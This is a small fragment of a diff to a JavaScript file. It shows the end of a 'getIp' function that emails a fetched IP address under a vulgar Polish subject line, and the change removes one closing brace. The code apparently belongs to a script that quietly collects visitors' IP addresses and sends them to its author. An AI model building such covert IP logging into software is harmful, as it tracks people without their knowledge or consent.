@@ -23,7 +23,6 @@ const getIp = () => {
         Subject: "IP KURWY",
         Body: data.ip,
       });
-    });
 };
 
 getIp();
